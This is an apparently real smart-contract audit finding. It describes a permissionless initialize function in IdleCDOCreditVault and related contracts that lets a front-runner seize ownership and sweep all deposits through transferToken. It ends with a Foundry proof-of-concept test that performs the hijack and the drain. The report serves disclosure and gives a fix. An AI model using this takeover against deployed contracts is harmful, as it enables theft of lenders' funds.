### Title
Permissionless `initialize` allows front-running takeover of credit vault proxy and theft of all deposited funds via `transferToken` recovery sweep - (File: contracts/IdleCDOCreditVault.sol)

### Summary
`IdleCDOCreditVault.initialize` (and the matching initializers in `IdleCreditVault`, `IdleCDOEpochQueue`, `IdleCreditVaultWriteOffEscrow` and `ProgrammableBorrower`) can be called by anyone exactly once. None of them restrict the caller to the deployer. An attacker who front-runs the legitimate initialization transaction of a newly deployed credit-vault proxy can set themselves as `_owner`/guardian and set `_governanceFund` (the recovery address) to an address they control. Once lenders deposit through the epoch queue, the attacker, as `owner()`, calls `GuardedLaunchUpgradable.transferToken` to sweep the entire underlying balance to their own recovery address.

### Finding Description
In `IdleCDOCreditVault.initialize` (contracts/IdleCDOCreditVault.sol:44-86) the only checks are `if (token != address(0)) revert AlreadyInitialized();`, zero-address checks on strategy/token, and a sanity bound on `_trancheAPRSplitRatio`. There is no `msg.sender` check:

- `GuardedLaunchUpgradable.__GuardedLaunch_init(_limit, _governanceRecoveryFund, _owner)` stores the attacker-supplied recovery address and transfers ownership to `_owner` (contracts/GuardedLaunchUpgradable.sol:30-40).
- `guardian = _owner` gives the attacker pause/emergency powers (IdleCDOCreditVault.sol:80).
- `transferToken(address _token, uint256 _value)` lets `owner()` move any ERC20 held by the vault to `governanceRecoveryFund` (GuardedLaunchUpgradable.sol:70-73).
- `_emergencyShutdown` in the same family also routes strategy funds back into the contract, where they are then sweepable by the attacker-owner.

The constructor only protects the *implementation* contract (`token = address(1)`); freshly deployed proxies have `token == address(0)` and are fully initializable by the first caller. The same pattern holds in `IdleCreditVault.initialize` (contracts/strategies/idle/IdleCreditVault.sol:124-147), where the attacker would additionally install themselves as `borrower`, and in `IdleCDOEpochQueue.initialize` (contracts/IdleCDOEpochQueue.sol:72-91), which approves unlimited underlying spend to whatever CDO address the initializer supplies.

### Impact Explanation
Direct theft of all vault TVL. After a hijacked initialization, honest lenders deposit underlying through the epoch queue into the CDO. The attacker, now `owner()`, calls `transferToken(underlying, balance)` and receives the full balance at the attacker-controlled `governanceRecoveryFund`. In the `IdleCreditVault` strategy variant, an attacker-installed `borrower` can also draw borrowed principal via the borrow path. Loss is unbounded — equal to total deposits.

### Likelihood Explanation
Low-to-medium. The attack requires winning a front-running race against the deployment/initialization transaction. However, deployment scripts that deploy the proxy and initialize in separate transactions, proxies deployed ahead of configuration, or upgrades via factory (`IdleCreditVaultFactory`) where deployment and wiring are not atomic all leave a window. No privileged action by an honest role is required to enable the attack — it exploits the exact gap described in the original bug class, and the payoff is the full vault balance, not just forcing a redeploy.

### Recommendation
Restrict `initialize` to the deploying entity, e.g. record `deployer = msg.sender` in the constructor of the implementation and check `msg.sender == deployer` in `initialize`, or deploy-and-initialize atomically inside the factory transaction. At minimum, enforce initialization in the same transaction as proxy deployment everywhere in `IdleCreditVaultFactory` and the queue/escrow deployment paths.

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-foundry/forge-std/Test.sol";
import "../contracts/IdleCDOCreditVault.sol";
import "../contracts/GuardedLaunchUpgradable.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20("USD Coin", "USDC") {
    function mint(address to, uint256 amt) external { _mint(to, amt); }
    function decimals() public pure override returns (uint8) { return 6; }
}

contract MockStrategy is IIdleCDOStrategy {
    address public override token;
    address public override strategyToken;
    constructor(address _token, address _stratToken) { token = _token; strategyToken = _stratToken; }
    function price() external view returns (uint256) { return 1e18; }
    // remaining IIdleCDOStrategy fns stubbed
}

contract InitHijackTest is Test {
    function testHijack() public {
        MockERC20 usdc = new MockERC20();
        MockStrategy strat = new MockStrategy(address(usdc), address(usdc));
        IdleCDOCreditVault impl = new IdleCDOCreditVault();
        // deployer deploys proxy, init tx pending
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");
        IdleCDOCreditVault cdo = IdleCDOCreditVault(address(proxy));

        // ATTACKER front-runs initialize
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        cdo.initialize(
            0,                    // no limit
            address(usdc),
            attacker,             // governanceRecoveryFund = attacker
            attacker,             // owner/guardian = attacker
            attacker,             // rebalancer
            address(strat),
            10000
        );
        assertEq(cdo.owner(), attacker);

        // lenders deposit (simplified: fund the vault directly)
        usdc.mint(address(cdo), 1_000_000e6);

        // attacker sweeps everything to governanceRecoveryFund (== attacker)
        vm.prank(attacker);
        GuardedLaunchUpgradable(address(cdo)).transferToken(address(usdc), 1_000_000e6);
        assertEq(usdc.balanceOf(attacker), 1_000_000e6);
    }
}
